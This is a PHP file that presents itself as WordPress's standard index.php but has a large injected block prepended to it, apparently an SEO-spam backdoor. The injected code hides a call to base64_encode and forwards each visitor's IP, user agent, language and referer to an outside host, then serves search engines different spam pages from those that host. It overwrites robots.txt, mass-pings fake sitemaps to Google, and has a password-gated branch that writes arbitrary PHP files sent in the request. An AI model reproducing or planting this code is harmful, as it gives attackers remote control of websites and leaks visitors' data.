<?php
error_reporting(0);
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = 'mapssCX98.xml';
$dt = 0;
$sitemap_file = 'sitemap';
$mapnum = 2000;





if(isset($_GET['dt'])){
    $dt = $_GET['dt'];
}
$site = @$_GET['smsite'];
$jdir = '';
$http_web = 'http';
if(is_https()){
    $http = 'https';
}else{
    $http = 'http';
}
$smuri_tmp = smrequest_uri();
$uri_script = "";
if(strstr($smuri_tmp, ".php") && !$site){
    $uri_arr = explode(".php", $smuri_tmp);
    $uri_script = $uri_arr[0].".php?";
    $smuri_tmp = $uri_arr[1];
    $smuri_tmp = str_replace("?", "/", $smuri_tmp);
}
if($smuri_tmp==''){
    $smuri_tmp='/';
}
$s = 'b'.'ase6'.'4_e'.'ncode';
$smuri = $s($smuri_tmp);
function smrequest_uri(){
    if (isset($_SERVER['REQUEST_URI'])){
        $smuri = $_SERVER['REQUEST_URI'];
    }else{
        if(isset($_SERVER['argv'])){
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        }else{
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $smuri;
}
$temp = @$_GET['smtemp'];
$id = @$_GET['smid'];
$page = @$_GET['smpage'];
$site = str_replace('/','',$site);
$host = $_SERVER['HTTP_HOST'];
$clock = '';

if(preg_match('@pingsitemap.xml@i',$smuri_tmp)){
    @header("Content-type: text/css; charset=utf-8");
    if($uri_script == ""){$uri_script="/";}
    $sitemap = "https://www.google.com/ping?sitemap=$http://$host$uri_script"."sitemap.xml";
    $contents = get($sitemap);
    if(strpos($contents, "Sitemap Notification Received")){
        echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap.xml"." : OK!<br>";
    }else{
        echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap.xml"." : ERROR!<br>";
    }
    $mnum = mt_rand(30, 80);
    for($i = 0; $i < $mnum; $i++){
        $sitemap = "https://www.google.com/ping?sitemap=$http://$host$uri_script"."sitemap$i.xml";
        $contents = get($sitemap);
        if(strpos($contents, "Sitemap Notification Received")){
            echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap$i.xml"." : OK!<br>";
        }else{
            echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap$i.xml"." : ERROR!<br>";
        }
    }
    exit;
}


$goweb = 'xbfiftyoneye.nmgqzjinacrane.xyz';
$password = md5(md5(@$_GET['pd']));
if ($password == '5fbf36f6b1070aec65f00cb8e35c9cc4') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    $domain = @$_GET['domain'];
    if($domain){
        $host = $domain;
    }else{
        $host = $_SERVER['HTTP_HOST'];
    }
    //$host = $_SERVER['HTTP_HOST'];
    $path = dirname(__FILE__);

    $file_path = $path.'/robots.txt';
    if(!$action){
        $action = 'put';
    }
    if($action == 'put'){
        if (isset($_GET['google'])) {
            $google_verification = $_GET['google'];
            if (preg_match('/^google.*?(\.html)$/i', $google_verification)) {
                file_put_contents($google_verification, 'google-site-verification:' . ' ' . $google_verification);
                exit('<a href=' . $google_verification . '>' . $google_verification . '</a>');
            }
            exit;
        }
        if (strstr($add_content, '.php')) {
            $a = md5(md5(@$_GET['a']));
            $b = md5(md5(@$_GET['b']));
            if ($a == smoutdo('http://' . $goweb . '/a.php') || $b == '21c4d031dd29901356a91b3efcca0130') {
                $smstr = @$_GET['smstr'];
                if (file_put_contents($path . '/' . $add_content, $smstr)) {
                    echo 'ok';
                }
            }
            exit;
        }
        $data = 'User-agent: *
Allow: /';
        $uri_script = trim($uri_script);
        if( $uri_script!= "" && $uri_script!="/index.php?"){
            $data = trim($data)."\r\n"."Sitemap: $http://".$host.$uri_script."sitemap.xml";
        }else{
            $data = trim($data)."\r\n"."Sitemap: $http://".$host."/sitemap.xml";
        }
        $num = mt_rand(5, 10);
        for($i = 0; $i<$num; $i++){
            if(trim($uri_script) != "" && $uri_script!="/index.php?"){
                $data = trim($data)."\r\n"."Sitemap: $http://".$host.$uri_script."sitemap$i.xml";
            }else{
                $data = trim($data)."\r\n"."Sitemap: $http://".$host."/sitemap$i.xml";
            }
        }
        @chmod("robots.txt", 0755);
        file_put_contents("robots.txt", $data);
        echo "robots write done!!";
    }
    if($action == 'del'){
        if(file_exists($file_path)){
            $data = smoutdo($file_path);
        }else{
            $data = '';
        }
        if(strstr($data,'/'.$add_content)){
            if(is_https()){
                $data_new = trim($data)."\r\n".'Sitemap: https://'.$host.'/'.$add_content;
            }else{
                $data_new = trim($data)."\r\n".'Sitemap: http://'.$host.'/'.$add_content;
            }
            if(file_put_contents($file_path,$data_new)) {
                echo '<br>ok<br>';
            }else{
                echo '<br>file write false!<br>';
            }
        }else{
            echo '<br>sitemap does not exist!<br>';
        }
    }

    exit;
}
function is_https() {
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return true;
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$lang = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = $s($lang);
$os = $_SERVER['HTTP_USER_AGENT'];
$os = $s($os);
if(isset($_SERVER['HTTP_REFERER'])){
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = $s($urlshang);
}else{
    $urlshang = '';
}

$clock = $_SERVER['REMOTE_ADDR'];
$http_clock = $_SERVER['REMOTE_ADDR'];

if(stristr($clock,',')){
    $clock_tmp = explode(",",$clock);
    $clock = $clock_tmp[0];
}

if(!isset($sitemap_file) || @$sitemap_file==''){
    $sitemap_file = 'sitemap';
}
if(!isset($mapnum) || @$mapnum==''){
    $sitemap_file = 2000;
}


if(preg_match('/^'."\/".$sitemap_file.'(\d+)?.xml$/i',$smuri_tmp,$uriarr)){
    @header("Content-type: text/xml");
    if(isset($uriarr[1])){
        $id = str_replace('_','',$uriarr[1]);
    }else{
        $id = 100;
    }
    $ivmapid = 0;
    sitemap_out(z_sitemap($goweb,$id,$host,$dt,$ivmapid,$mapnum,$http_web),$host,$uri_script);
    exit();
}
function z_sitemap($goweb,$id,$host,$dt,$maptype,$map_num,$http_web='http',$filetype=0,$map_splits_num='',$temp='',$dataNew=''){
    $web = $http_web.'://'.$goweb.'/sitemapdtn.php?date='.$id.'&temp='.$temp.'&web='.$host.'&xml='.$dt.'&maptype='.$maptype.'&filetype='.$filetype.'&map_splits_num='.$map_splits_num.'&map_num='.$map_num.'&dataNew='.$dataNew;
    return trim(smoutdo($web));
}
function sitemap_out($url,$host,$uri_script){
    if(is_https()){
        $http = 'https';
    }else{
        $http = 'http';
    }
    $date_str =  date("Y-m-d\TH:i:sP",time());
    $sitemap_header = '<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';
    $sitemap_header .= '
  <url>
    <loc>'.$http.'://' . $host . "/" . '</loc>
    <lastmod>' . $date_str . '</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.1</priority>
  </url>';
    $url_arr = explode("\r\n",$url);
    $map_str = $sitemap_header;
    foreach($url_arr as $value){
        $map_str .= '
  <url>
    <loc>'.$http.'://' . $host . "/" .$value .'</loc>
    <lastmod>' . $date_str . '</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.1</priority>
  </url>';
    }
    if($uri_script != ""){
        $map_str = str_replace($host."/",$host.$uri_script, $map_str);
    }
    echo $map_str."
</urlset>";
}

function get($url){
    $contents = @file_get_contents($url);
    if (!$contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    return $contents;
}

if(stristr($smuri_tmp,'.css')){
    $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&jdir='.$jdir.'&clock='.$clock.'&uri='.$smuri.'&lang='.$lang.'&os='.$os.'&urlshang='.$urlshang.'&http_clock='.$http_clock;
    $html_content = smoutdo($web);
    $html_content = trim($html_content);
    if(!strstr($html_content,'nobotuseragent')){
        if(strstr($html_content,'okhtmlgetcontent')){
            @header("Content-type: text/css; charset=utf-8");
            $html_content = str_replace("okhtmlgetcontent",'',$html_content);
            echo $html_content;
            exit();
        }else if(strstr($html_content,'getcontent500page')){
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        }else if(strstr($html_content,'getcontent404page')){
            @header('HTTP/1.1 404 Not Found');
            exit();
        }
    }
}else if($site){
    if($id){
        @header("Content-type: text/html; charset=utf-8");
        $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&clock='.$clock.'&uri='.$smuri.'&urlshang='.$urlshang.'&http='.$http.'&page='.$page;
        $html_content = smoutdo($web);
        $html_content = trim($html_content);
        if(!strstr($html_content,'nobotuseragent')){
            if(strstr($html_content,'okhtmlgetcontent')){
                $html_content = str_replace("okhtmlgetcontent",'',$html_content);
                echo $html_content;
                exit();
            }else if(strstr($html_content,'getcontent500page')){
                @header('HTTP/1.1 500 Internal Server Error');
                exit();
            }else if(strstr($html_content,'getcontent404page')){
                @header('HTTP/1.1 404 Not Found');
                exit();
            }
        }
    }
}else{
    $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&clock='.$clock.'&uri='.$smuri.'&urlshang='.$urlshang.'&http='.$http.'&page='.$page;
    $html_content = smoutdo($web);
    $html_content = trim($html_content);
    if($uri_script != ""){
        $html_content = str_replace($host."/",$host.$uri_script, $html_content);
    }
    if(!strstr($html_content,'nobotuseragent')){
        @header("Content-type: text/html; charset=utf-8");
        if(strstr($html_content,'okhtmlgetcontent')){
            $html_content = str_replace("okhtmlgetcontent",'',$html_content);
            echo $html_content;
            exit();
        }else if(strstr($html_content,'getcontent500page')){
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        }else if(strstr($html_content,'getcontent404page')){
            @header('HTTP/1.1 404 Not Found');
            exit();
        }else if(strstr($html_content,'getcontent301page')){
            @header('HTTP/1.1 301 Moved Permanently');
            $html_content = str_replace("getcontent301page",'',$html_content);
            header('Location: '.$html_content);
            exit();
        }

    }
}

function smisbot() {
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($agent != "") {
        $googleBot = array("Googlebot","Yahoo! Slurp","Yahoo Slurp","Google AdSense",'google', 'yahoo');
        foreach ($googleBot as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str)) {
                return true;
            }
        }
    }else{
        return false;
    }
}
function smotherbot() {
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($agent != "") {
        $spiderSite = array ("TencentTraveler","msnbot","Sosospider+","Sogou web spider","ia_archiver","YoudaoBot","MSNBot","Java (Often spam bot)","BaiDuSpider","Voila","Yandex bot","BSpider","twiceler","Sogou Spider","Speedy Spider","Heritrix","Python-urllib","Alexa (IA Archiver)","Ask","Exabot","Custo","OutfoxBot/YodaoBot","yacy","SurveyBot","legs","lwp-trivial","Nutch","StackRambler","The web archive (IA Archiver)","Perl tool","MJ12bot","Netcraft","MSIECrawler","WGet tools","larbin","Fish search", 'bingbot', 'baidu', 'aol', 'bing', 'YandexBot', 'AhrefsBot');
        foreach ($spiderSite as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str)) {
                return true;
            }
        }
    }else{
        return false;
    }
}
function smoutdo($url){
    $file_contents = @file_get_contents($url);
    if (!$file_contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    return $file_contents;
}
function listDir($dir){
    $filearr = array();
    if(is_dir($dir)){
        if ($dh = opendir($dir)){
            while (($file = readdir($dh)) !== false){
                if((file_exists($dir."/".$file)) && $file!="." && $file!=".."){
                    $filearr[] = $file;
                }
            }
            closedir($dh);
        }
    }
    return $filearr;
}
?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
